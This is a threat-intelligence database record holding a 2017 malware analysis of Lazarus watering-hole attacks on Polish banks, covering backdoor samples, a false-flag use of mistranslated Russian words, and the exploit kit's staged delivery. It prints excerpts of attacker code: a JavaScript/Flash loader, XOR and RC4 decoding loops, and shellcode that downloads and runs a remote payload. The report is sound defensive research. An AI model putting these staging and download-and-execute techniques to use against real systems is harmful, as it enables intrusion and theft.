{
    "id": "2ac6d1b6-89fb-42d0-80d1-eb3215ff1dfd",
    "created_at": "2023-01-12T15:08:37.900058Z",
    "updated_at": "2025-03-27T02:17:23.512599Z",
    "deleted_at": null,
    "sha1_hash": "a827327ac25a2decf9f138af9b55b83a33743874",
    "title": "2017-02-20 - Lazarus’ False Flag Malware",
    "authors": "",
    "file_creation_date": "2022-05-28T19:30:01Z",
    "file_modification_date": "2022-05-28T19:30:01Z",
    "file_size": 524163,
    "plain_text": "# Lazarus’ False Flag Malware\n\n**[baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html](https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html)**\n\n_Written by Sergei Shevchenko and Adrian Nish_\n\nBACKGROUND\n\nWe continue to investigate the recent wave of attacks on banks using watering-holes on at\nleast two financial regulator websites as well as others. Our initial analysis of malware\ndisclosed in the BadCyber blog hinted at the involvement of the 'Lazarus' threat actor. Since\nthe release of our report, more samples have come to light, most notably those described in\n[the Polish language niebezpiecznik.plblog on 7 February 2017.](https://niebezpiecznik.pl/post/jak-przeprowadzono-atak-na-knf-i-polskie-banki-oraz-kto-jeszcze-byl-na-celowniku-przestepcow/)\n\n\nMD5 hash Filename Compile\nTime\n\n\nFile Info Submitted\n\n\n9216b29114fb6713ef228370cbfe4045 srservice.chm N/A N/A N/A\n\n8e32fccd70cec634d13795bcb1da85ff srservice.hlp N/A N/A N/A\n\n\ne29fe3c181ac9ddbb242688b151f3310 srservice.dll 201610-22\n\n08:08\n\n9914075cc687bdc352ee136ac6579707 fdsvc.exe 201608-26\n\n04:19\n\n\nWin64\nDLL\n78 KB\n\nWin64\nEXE\n\n60 KB\n\n\n2017-0128\n\n11:58\n\n2017-0205\n\n15:14\n\n\n-----\n\n9cc6854bc5e217104734043c89dc4ff8 fdsvc.dll 201608-26\n\n04:11\n\n\nEncrypted\n\n470 KB\n\n\n2017-0205\n\n15:15\n\n\nOf the hashes provided, only three samples could be found in public malware repositories.\nAll three had been submitted from Poland in recent weeks.\n\nIn the analysis section below we examine these and the ‘false flag’ approach employed by\nthe attackers in order to spoof the origin of the attack. The same ‘false flag’ approach was\n[also found in the SWF-based exploit mentioned in our previous blogpost:](http://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html)\n\nMD5 hash Filename File Info Submitted\n\n6dffcfa68433f886b2e88fd984b4995a cambio.swf Adobe Flash 2016-12-07 23:15\n\nHere we’ll analyse these files as well as shed further light on the watering-hole exploit kit\ncode itself, in the hope this aids further detection and network defence.\n\nANALYSIS\n\nSample #1 – srservice.chm\n\nMost likely, this file is an encrypted backdoor that is decrypted and injected by DLL loader.\nThe filename `srservice.chm is consistent with the method in which a known Lazarus`\ntoolkit module constructs CHM and HLP file names:\n\n```\n%SYSTEMROOT%\\Help\\%MODULE_NAME%.chm\n\n```\n```\n%SYSTEMROOT%\\Help\\%MODULE_NAME%.hlp\n\n```\nSample #2 – srservice.hlp\n\nMost likely, this file is an encrypted configuration file, which is decrypted and loaded by the\nsample #1 ( srservice.chm ).\n\nSample #3 – srservice.dll\n\nThis DLL loads, decrypts and injects the 'CHM' file into the system `lsass.exe process.`\n\nSample #4 – fdsvc.exe\n\nThis file is a command line tool that accepts several parameters such as encrypted file name\nand process ID. The tool reads and decrypts the specified file, and then injects it into the\nspecified process or into the system process `explorer.exe .`\n\n\n-----\n\nThe encryption consists of a running XOR, followed with RC4, using the 32-byte RC4 key\nbelow:\n```\nA6 EB 96 00 61 B2 E2 EF 0D CB E8 C4 5A F1 66 9C\nA4 80 CD 9A F1 2F 46 25 2F DB 16 26 4B C4 3F 3C\n\n```\nSample #5 – fdsvc.dll\n\nThe file `fdsvc.dll is an encrypted file, successfully decrypted into a valid DLL (MD5:`\n```\n889e320cf66520485e1a0475107d7419 ) by the aforementioned executable fdsvc.exe .\n\n```\nOnce decrypted, it represents itself as a bot that accepts the C&C name and port number(s)\nas a string parameter that is used to call the DLL. The parameter is encoded with an XOR\nloop that includes XOR key `cEzQfoPw .`\n\nMultiple C&C servers can be delimited with the ' | ' character and port numbers are\ndelimited from the C&C servers with the `':' character.`\n\nOnce the bot has established communication with the remote C&C, it uses several\ntransliterated Russian words to either indicate the state of its communication or issue\nbackdoor commands, such as:\n\nWord State/Backdoor Command\n\n\"Nachalo\" start communication session\n\n\"ustanavlivat\" handshake state\n\n\"poluchit\" receive data\n\n\"pereslat\" send data\n\n\"derzhat\" maintain communication session\n\n\"vykhodit\" exit communication session\n\nThe binary protocol is custom. For example, during the \"ustanavlivat\" (handshake) mode, the\nbot accepts 4 bytes, which are then decrypted. The decryption is a loop that involves multiple\nXOR operations performed over the received data. Once decrypted, the 4 bytes indicate the\nsize of the next data chunk to be received.\n\nThe next received data chunk is also decrypted, and its contents checked to see whether it's\none of the backdoor commands.\n\n\n-----\n\nFor example, the _poluchit command instructs the bot to receive the file, and the_ _pereslat_\n(send) command instructs the bot to upload the file. The received \"poluchit\" command may\nalso contain a URL, marked with another transliterated Russian word \"ssylka\" (link). In this\ncase, the remote file is fetched in a separate thread. If a received data chunk contains the\ncommand \"vykhodit\", the bot quits its backdoor loop.\n\nThe bot implements the SSL/TLS protocol, and is based on a source code of \"Curl v7.49.1\".\nHence, it is able to transfer files via HTTP, HTTPS, FTP, SMTP and many other protocols,\nwith full support of user/password authentication (Basic, Digest, NTLM, Negotiate, Kerberos),\nproxies and SSL certificates.\n\nRussian language used in fdsvc.dll\n\nIn spite of some 'Russian' words being used, it is evident that the malware author is not a\nnative Russian speaker.\n\nOf our previous examples, five of the commands were likely produced by an online\ntranslation. Below we provide the examples and the correct analogues for reference:\n\nWord Type of error Correct analogue\n\n_\"ustanavlivat\"_ omitted sign at the end, verb tense error _\"ustanovit'\" or \"ustanoviti\"_\n\n_\"poluchit\"_ omitted sign at the end _\"poluchit'\" or \"poluchiti\"_\n\n_\"pereslat\"_ omitted sign at the end _\"pereslat'\" or \"pereslati\"_\n\n_\"derzhat\"_ omitted sign at the end _\"derzhat'\" or \"derzhati\"_\n\n_\"vykhodit\"_ omitted sign at the end, verb tense error _\"vyiti\"_\n\nAnother example is \"kliyent2podklyuchit\". This is most likely a result of an online translation\nof \"client2connect\" (which means 'client-to-connect'). In this case, the two words \"client\" and\n_\"connect\" were translated separately, then transliterated from the Russian pronunciation form_\ninto the Latin alphabet and finally joined to produce \"kliyent2podklyuchit\".\n\nSuch a result may look impressive to the bot's author, but would be difficult to understand for\nnative Russian speakers.\n\n\n-----\n\nHere we provide an example of translating the word \"client\" in Russian - the word \"kliyent\"\nhere only demonstrates phonetic pronunciation, not how it's actually written in a transliterated\nform. When formed using the Latin alphabet, it would actually be written \"client\" or \"klient\".\n\nDue to such inconsistencies, we conclude that the Russian language is likely used as a\ndecoy tactic, in order to spoof the malware’s country of origin.\n\nSample #6 – cambio.swf\n\nDuring the investigation of the watering-hole incident, the owner of a compromised website\nshared with us a malicious implant that was added into the site, presumably by using an\nexploit against JBoss 5.0.0.\n\nThe script is called `view_jsp.java and is accessed from the watering-hole website as`\n```\nview.jsp .\n\n```\nThis script is responsible for serving `cambio.swf .`\n\nThe infection starts from a primary web site being compromised so that its visitors are\nredirected into a secondary website, calling its `view.jsp script from an added IFrame. The`\ninitial request contains parameter `pagenum set to` `1, such as:`\n```\n\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\"\n\n```\nThis begins the profiling and filtering to identify potential victims. For example, the script then\nchecks to see if the client's IP is black-listed. If so, such initial request is rejected.\n\nNext, the script checks if the client’s IP is white-listed (i.e. targeted). If not white-listed, it is\nalso rejected. Hence, unless the visitor’s IP is on the attackers’ list, the script will not attempt\nto infect their machine. This helps the infected websites stay undetected for relatively long\nperiod of time, as they only serve exploits to the selected targets.\n\n\n-----\n\nIn the next stage of the script, it builds and serves back to the client an HTML page with an\nembedded JavaScript that detects the type of client’s browser (Internet Explorer, Google\nChrome, Firefox, Safari, or Opera), OS version, and the loaded plugins, such as Adobe\nFlash and Microsoft Silverlight.\n\nThe script executed on a client side then builds a form, and submits it back to the gateway\nscript, as shown below:\n\nThe submitted form specifies the `pagenum parameter to be set to` `2, to advance the script`\nto the next step:\n\n\n-----\n\nOnce the script accepts the incoming request and finds the form's `pagenum value is` `2, it`\nreads other fields from the submitted form and decides which exploit to serve back to the\nclient.\n\nAt the time of writing, the exploit kit known to serve back two exploits, for Adobe Flash and\nMicrosoft Silverlight, though these could be expanded upon as needed.\n\nThe exploits can be individually enabled or disabled by the attackers with the standalone file\n```\nconfig.dat . For example, to enable both exploits (flag= 1 ), the contents of this file can be\n\n```\nset to:\n\n```\n2016-0034:1\n\n```\n```\n0000-0001:1\n\n```\nwhere `2016-0034 identifies the Silverlight exploit, and` `0000-0001 is the Flash exploit.`\n\nIf the script detects that the submitted form contains a non-empty version of Silverlight\nbrowser plugin, it will generate and serve back a Silverlight exploit. If the submitted form has\na non-empty version of Adobe Flash browser plugin, the script will generate and serve back\nthe Flash exploit. If the client has both plugins loaded within the browser, then the script will\nserve the Flash exploit only.\n\nNOTE: the script only serves the Flash exploit if the browser is Internet Explorer.\n\nThe exploits are generated by the functions:\n\n     - `genExp_20160034() – to generate Silverlight exploit`\n     - `genExp_00000001() – to generate Flash exploit`\n\n\n-----\n\nThe latter is explained in further detail below. First, the script builds URL string named as\n```\ndownload_url :\n 01 String PARAMNAME_UID = \"uid\";\n 02 String PARAMNAME_PAGENUM = \"pagenum\";\n 03 String PARAMNAME_EXPLOITID = \"eid\";\n 04 String PARAMNAME_STATUS = \"s\";\n 05 String PARAMNAME_DATA = \"data\";\n\n```\n```\n06\n\n```\n```\n 07 download_url = request.getRequestURL() +\n 08 \"?\" + PARAMNAME_UID + \"=\" + uid +\n 09 \"&\" + PARAMNAME_PAGENUM + \"=3\" +\n 10 \"&\" + PARAMNAME_EXPLOITID +\n 11 \"=\" + exploit.get(\"eid\");\n 12 ...\n 13 download_url = download_url +\n 14 \"&\" + PARAMNAME_STATUS + \"=2\" +\n 15 \"&\" + PARAMNAME_DATA + \"=\";\n\n```\nFor example, the URL string may look like:\n```\nhttp://[WEB_SITE]/view.jsp?uid=30304811&pagenum=3&eid=00000002&s=2&data=\n\n```\nNote that the `pagenum parameter of the URL has now advanced to` `3 (third step of the`\n```\nview.jsp execution).\n\n```\nThis URL string will be embedded by the `genExp_00000001() function into the body of the`\nshellcode.\n\nThe output of the `genExp_00000001() function is JavaScript that has the following format –`\nthis script will be executed inside the client's browser:\n```\n 01 var laskfji = 'PGh0bWw+..'; // long string here\n 02 asdlfkj = function(s) {\n\n```\n\n-----\n\n```\n 03 // base64-decode string s\n 04 };\n 05 var polkio = asdlfkj(laskfji);\n 06 var poikea = 'document.write(polkio);';\n 07 eval(poikea);\n\n```\nOnce the string `s is base64-decoded by client-based JavaScript, it will look like a Flash`\nobject embedded into HTML:\n```\n 01 <html>\n 02 <body>\n 03 <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\"\n 04 codebase=\"http://download.macromedia.com/.../swflash.cab\"\n 05 width=\"1\"\n 06 height=\"1\" >\n 07 <param name=\"movie\" value=\"include/cambio.swf\" />\n 08 <param name=\"allowScriptAccess\" value=\"always\" />\n 09 <param name=\"FlashVars\"\n 10 value=\"shell=558BEC83...00&Health=polki89jdm#ks@\" />\n 11 <param name=\"Play\" value=\"true\" />\n 12 <embed type=\"application/x-shockwave-flash\"\n 13 width=\"1\"\n 14 height=\"1\"\n 15 src=\"include/cambio.swf\"\n 16 allowScriptAccess=\"always\"\n 17 FlashVars=\"shell=558BEC83...00&Health=polki89jdm#ks@\"\n 18 Play=\"true\"/>\n 19 </object>\n 20 </body>\n\n```\n\n-----\n\n```\n 21 </html>\n\n```\nAs seen in the Flash object parameters, the SWF object is served from the website’s path:\n```\ninclude/cambio.swf\n\n```\nHowever, the SWF object is also accompanied with 2 extra parameters:\n\nSWF Parameter Value\n\n\"shell\" 558BEC83EC388D45C8C745F...\n\n\"Health\" polki89jdm#ks@\n\nBy looking into the decompiled `cambio.swf file, its ActionScript reveals that the SWF file`\nindeed expects 2 parameters: `Health and` `shell .`\n\nThe value of `Health is used as an XOR key to decode the binary blob` `orinBin, which is`\nincluded in the SWF file. This blob is then loaded with `loadBytes(), as shown below:`\n```\n 01 objLoader = new Loader();\n 02 this.params = loaderInfo.parameters;\n 03 ...\n 04 var key:String = params[\"Health\"] as String;\n 05 var pShell:String = params[\"shell\"] as String;\n 06 var objShellData:SharedObject = SharedObject.getLocal(\"Exp_Data\");\n 07 objShellData.clear();\n 08 objShellData.data.shell = pShell;\n 09 objShellData.flush();\n 10 var blob:ByteArray = new orinBin() as ByteArray;\n 11 var i:int = 0;\n 12 while(i < blob.length)\n 13 {\n 14 blob[i] = blob[i] ^ key.charCodeAt(i % key.length);\n 15 i++;\n\n```\n\n-----\n\n```\n 16 }\n 17 blob.position = 0;\n 18 objLoader.contentLoaderInfo.addEventListener(\"complete\",fncomp);\n 19 objLoader.loadBytes(blob);\n\n```\nBelow is the binary blob `orinBin as seen within the SWF file:`\n\nBy knowing the value of `Health parameter, it is now possible to use it as an XOR key to`\ndecode the `orinBin blob within the SWF code.`\n\nOnce decrypted, the `orinBin blob presents another SWF file. This time, it contains 3`\nencrypted blobs within: `bin22,` `bin23, and` `bin24 seen below:`\n\nThe code decrypts the blobs with RC4, using `\"littleEndian\" as the RC4 key. These`\nblobs also turn out to be SWF files that contain the SWF exploit code.\n\nInternally, the ActionScript also uses transliterated Russian words, similar to the tactic seen\nin the bot code:\n\nTransliterated Russian words used in AS Translated from Russian\n\n_Podgotovkaskotiny_ Preparation of farm animals\n\n_geigeigei3raza_ Hey, hey, hey 3 times\n\n_chainik_ Dummy (a stupid person)\n\n_chainikaddress_ Dummy's address\n\n\n-----\n\n_poishemdatu_ Let’s search for data\n\n_poiskvpro_ Searching in 'pro'\n\n_vyzov_chainika_ Calling the dummy (a stupid person)\n\n_daiadreschainika_ Get address of the dummy\n\n_runskotina_ Execute farm animals\n\n_babaLEna_ Old woman Lena\n\nAs seen in the table, while the words are technically Russian, their usage is out-of-context.\n\nIn one code fragment, the ActionScript contains both \"chainik\" and \"dummy\":\n```\n 01 private function put_dummy_args(param1:*) : *\n 02 {\n 03 return chainik.call.apply(null,param1);\n 04 }\n 05 private function vyzov_chainika() : *\n 06 {\n 07 return chainik.call(null);\n 08 }\n\n```\nAs such, it is obvious that the word \"dummy\" has been translated into \"chainik\". However, the\nword \"chainik\" in Russian slang (with the literal meaning of \"a kettle\") is used to describe an\nunsophisticated person, a newbie; while, the word \"dummy\" in the exploit code is used to\nmean a \"placeholder\" or an \"empty\" data structure/argument.\n\nIn the same way, it is likely the word \"farm animals\" was originally used to represent \"a\nbeast\". Yet, it has been translated into a word that is only synonymous to \"the beast\" in a\ncertain context.\n\nAs a result, they have used the words \"farm animals\" across the shellcode instead of \"beast\";\nwhich makes little sense.\n\nAs in the case of sample #5 ( fdsvc.dll ), it is likely that this loose Russian translation,\nevidently performed by a non-Russian speaker, is intended to spoof the malware origin.\n\n\n-----\n\nShellcode\n\nThe SWF's ActionScript then loads and executes the shellcode that was passed to the SWF\nfile. As with the `Health parameter, by having access to the server-side code it is now`\npossible to analyse what shellcode has been served to be executed via SWF file.\n\nThe shellcode consists of 2,372 bytes of a Win32-code (in fact, 2,369 bytes padded with\nthree zero bytes to make it 4-byte aligned).\n\nThe shellcode passed via the `shell parameter consists of two parts:`\n\n   - The first part of the shellcode (818 bytes) creates a hidden process of\n```\n   notepad.exe . It then injects the second part of the shellcode into it using the\n\n```\n_VirtualAlloc() and WriteProcessMemory() APIs, and finally it runs the injected code with_\n_CreateRemoteThread() API._\n\n   - The second part of the shellcode (1,551 bytes) is encoded with XOR `0x57 :`\n```\n seg000:00000316 mov  ecx, 1551  ; counter\n seg000:0000031B mov  ebx, 57h  ; XOR key\n seg000:00000320 loop:\n seg000:00000320 xor  [eax], ebx\n seg000:00000322 dec  ecx     ; decrement counter\n seg000:00000323 inc  eax     ; advance pointer\n seg000:00000324 test  ecx, ecx\n seg000:00000326 jnz  short loop\n\n```\nIt's worth noting that both parts of the shellcode load the APIs similarly to all other tools from\nthe Lazarus toolset, e.g.:\n```\n 01 urlmon_dll = 'mlrU';      // Urlm\n 02 urlmon_dll_4 = 'd.no';     // on.d\n 03 urlmon_dll_8 = 'll';      // ll\n 04 URLDownloadToFileW = 'DLRU';  // URLD\n 05 URLDownloadToFileW_4 = 'lnwo'; // ownl\n\n```\n\n-----\n\n```\n 06 URLDownloadToFileW_8 = 'Tdao'; // oadT\n 07 URLDownloadToFileW_12 = 'liFo'; // oFile\n 08 URLDownloadToFileW_16 = 'We';  // eW\n 09 hLib = LoadLibrary(&urlmon.dll);\n 10 ptr[8] = (*(int)ptr[4])(hLib,  // ptr[4]->GetProcAddress\n 11             &URLDownloadToFileW);\n\n```\nOnce decoded, the second part of the shellcode reads the URL embedded at the end, then\ndownloads and saves a file under a temporary file name, using the prefix `\"tmp\" .`\n\nNext, it reads the temporary file into memory, decrypts it with the following XOR loop, starting\nfrom the 318th byte:\n```\n 01 for (i = 317; i < file_size; ++i )\n 02 {\n 03 buffer[i] ^= 0xCC ^ ((buffer[i] ^ 0xCC) >> 4);\n 04 }\n\n```\nNext, it makes the decoded data executable by assigning it `PAGE_EXECUTE_READWRITE`\nmemory protection mode, and calls it, as shown below:\n```\n 01 (*(void)(ptr[68]))(buffer + 318,   // ptr[68]->VirtualProtect\n 02          file_size - 318,  // skip the first 318 bytes\n 03          PAGE_EXECUTE_READWRITE,\n 04          &oldProtect);            \n 05 ((void (*)(void))(buffer + 318))();  // CALL from the 318th byte\n\n```\nThis way, the 2nd part of the shellcode downloads a binary from the same gateway script as\nbefore. `pagenum=3 means it's a 3rd step – a step of serving the next chunk of the`\nshellcode.\n\nTo understand the next step we need to go back to the gateway script to see how it\nprocesses the `pagenum=3 request.`\n\n\n-----\n\nWhen the script receives a `pagenum=3 request, it checks the` `s` URL parameter\n('status'). Initially, this parameter is set to `2 ( 's=2', as seen in the aforementioned URL`\nembedded into the SWF exploit).\n\nThus, the script will read and output the contents of 2 files stored on the web server:\n```\nfiles/mark180789172360.ico\nfiles/back283671047171.dat\n\n```\nThe first file is likely a valid ICO file, is 318 bytes in size, and its contents are not encoded\n(hence the reason why the shellcode skips the first 318 bytes, and only decodes the rest).\n\nThe second file is a 3rd chunk of the shellcode, and its contents are encoded.\n\nIn addition to these 2 files, the output is appended with a URL. This time, it will specify\n```\npagenum parameter set to 3, but the status parameter s will now be set to 3 . For\n\n```\nexample, the URL may look like:\n```\nhttp://[WEB_SITE]/view.jsp?uid=30304811&pagenum=3&s=3\n\n```\nThe appended URL will then be encoded the same way as the file\n```\nback283671047171.dat :\n 01 for (int i = 0; i < len + 9; i++)\n 02 {\n 03 byte var = b[i];\n 04 byte temp = (byte)((var >> 4) & 0x0F);\n 05 var = (byte)(var ^ temp);\n 06 var = (byte)(var ^ 0xCC);\n 07 b[i] = var;\n 08 }\n\n```\nThis way, the encoded URL becomes an integral part of the 3rd part of the shellcode – same\nway as the 2nd part of the shellcode was appended with a URL.\n\nFollowing that, the script serves back a blob that consists of three parts:\n\n     - `files/mark180789172360.ico, not encoded (318 bytes)`\n     - `files/back283671047171.dat, encoded`\n   - download URL, encoded\n\n\n-----\n\nIt is served back as a binary file, disguised as an icon file `probg[RANDOM].ico, probably in`\nan attempt to bypass network sniffers (in other words, the encrypted shellcode is served\n_appended to a valid icon file):_\n```\nresponse.setHeader(\"Accept-Ranges\", \"bytes\");\nresponse.setHeader(\"Content-Length\", String.format(\"%d\", response_len));\nresponse.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"probg\" +\nrand.nextInt(9000) + 10000 + \".ico\\\"\");\nresponse.setHeader(\"Content-Type\", \"application/octet-stream\");\n\n```\nOnce this 3rd part of the shellcode is served back to the shellcode that runs on a client side,\nit will skip the first 318 bytes, decode the rest and execute it. This will invoke another binary\ndownload – this time identified with the status value of `3 ( 's=3' ).`\n\nThe new binary is generated by `view.jsp script and is almost identical to the 3rd part of`\nthe shellcode.\n\nThe only difference is that the binary blob consists of these files:\n```\nfiles/mark180789172360.ico, not encoded (318 bytes), as before\nfiles/meml102783047891.dat, encoded\n\n```\nThe 2nd file is now different, and the URL is no longer appended. The reason why the new\nbinary does not need the URL embedded may be that this binary contains an actual\nmalicious executable, detached, decoded, and executed by the shellcode, thus leading to a\nfull compromise of the victim.\n\nIndeed, as seen in the web log below, the last GET request with the `pagenum=3 and` `s=3`\nparameters is served with a 123,710-byte response – large enough to accommodate a PEexecutable:\n```\n\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\" 200 66148\n\"POST /[PATH]/view.jsp HTTP/1.1\" 200 13991\n\"GET /[PATH]/view.jsp?uid=30304811&pagenum=3&eid=00000002&s=2&data=\nHTTP/1.1\" 200 4642\n\"GET /[PATH]/view.jsp?uid=30304811&pagenum=3&s=3 HTTP/1.1\" 200 123710\n\n```\nNOTE: At the time of analysis, the ICO/DAT files were not available. Hence, their contents\nremains unknown.\n\nOverall Scheme\n\nThe following scheme illustrates the steps outlined above:\n\n\n-----\n\nCONCLUSIONS\n\nHere we have analysed further files from the recent watering-hole attacks directed at Polish\nfinancial institutions and others. Evidently, the Lazarus group are continuing their campaign\ntargeting banking networks. Their watering-hole mechanism is fairly sophisticated – its\nmultiple stages are designed to complicate analysis of its malware distribution, and at the\nsame, stay undetected for as long as possible.\n\nBecause of the previously disclosed attribution links, the group are also resorting to some\ntrickery.\n\nThrough reverse-engineering, we can see the use of many Russian words that have been\ntranslated incorrectly. In some cases the inaccurate translations have transformed the\nmeaning of the words entirely. This strongly implies that the authors of this attack are not\nnative Russian speakers and, as such, the use of Russian words appears to be a 'false flag'.\nClearly the group behind these attacks are evolving their modus operandi in terms of\ncapabilities – but also it seems they’re attempting to mislead investigators who might jump to\nconclusions in terms of attribution.\n\n\n-----\n\nAPPENDIX A: INDICATORS OF COMPROMISE\n\nMD5 Hashes `9cc6854bc5e217104734043c89dc4ff8`\n\n```\n9914075cc687bdc352ee136ac6579707\n\n```\n```\ne29fe3c181ac9ddbb242688b151f3310\n\n```\n```\n9216b29114fb6713ef228370cbfe4045\n\n```\n```\n8e32fccd70cec634d13795bcb1da85ff\n\n```\n```\n889e320cf66520485e1a0475107d7419\n\n```\n```\n6dffcfa68433f886b2e88fd984b4995a\n\n```\n\nFilenames `cambio.swf`\n\n```\ncambio.xap\n\n```\n```\nmark180789172360.ico\n\n```\n```\nmeml102783047891.dat\n\n```\n```\nback283671047171.dat\n\n```\n\nURLs `view.jsp?pagenum=1`\n\n```\nview.jsp?uid=\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-02-20 - Lazarus’ False Flag Malware.pdf"
    ],
    "report_names": [
        "2017-02-20 - Lazarus’ False Flag Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6c4e4b91-1f98-49e2-90e6-435cea8d3d53",
            "created_at": "2022-10-25T16:07:23.693797Z",
            "updated_at": "2025-03-27T02:02:09.924056Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "ATK 92",
                "Pasty Draco",
                "Subaat",
                "TAG-CR5"
            ],
            "source_name": "ETDA:Gorgon Group",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Atros2.CKPN",
                "Bladabindi",
                "CinaRAT",
                "Crimson RAT",
                "ForeIT",
                "Jorik",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "MSIL",
                "MSIL/Crimson",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Origin Logger",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "SEEDOOR",
                "Scarimson",
                "Socmer",
                "Yggdrasil",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "18278778-fa63-4a9a-8988-4d266b8c5c1a",
            "created_at": "2023-01-06T13:46:38.769816Z",
            "updated_at": "2025-03-27T02:00:02.914024Z",
            "deleted_at": null,
            "main_name": "The Gorgon Group",
            "aliases": [
                "ATK92",
                "G0078",
                "Pasty Gemini",
                "Gorgon Group",
                "Subaat"
            ],
            "source_name": "MISPGALAXY:The Gorgon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "97fdaf9f-cae1-4ccc-abe2-76e5cbc0febd",
            "created_at": "2022-10-25T15:50:23.296989Z",
            "updated_at": "2025-03-27T02:00:55.432751Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "Gorgon Group"
            ],
            "source_name": "MITRE:Gorgon Group",
            "tools": [
                "NanoCore",
                "QuasarRAT",
                "Remcos",
                "njRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
